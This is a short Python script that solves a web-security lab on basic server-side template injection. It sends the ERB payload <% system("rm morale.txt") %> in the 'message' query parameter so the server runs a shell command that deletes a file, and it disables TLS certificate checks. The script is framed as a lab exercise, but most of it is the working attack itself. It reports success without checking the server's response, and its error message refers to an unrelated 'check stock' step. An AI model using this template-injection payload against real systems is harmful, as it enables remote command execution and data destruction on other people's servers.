import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Basic server-side template injection"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the main page with the injected payload in the message query parameter\n2. Observe that the morale.txt file is successfully deleted\n""")

    print(Fore.WHITE + "Injection parameter: " + Fore.YELLOW + "message")

    payload = """<% system("rm morale.txt") %>"""

    print(Fore.WHITE + "[+] Fetching the main page with the injected payload")

    try:
        r = requests.get(
            f"{url}/?message={payload}", verify=False, allow_redirects=False, proxies=proxies)
        print(Fore.WHITE + "The morale.txt file is successfully deleted")
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
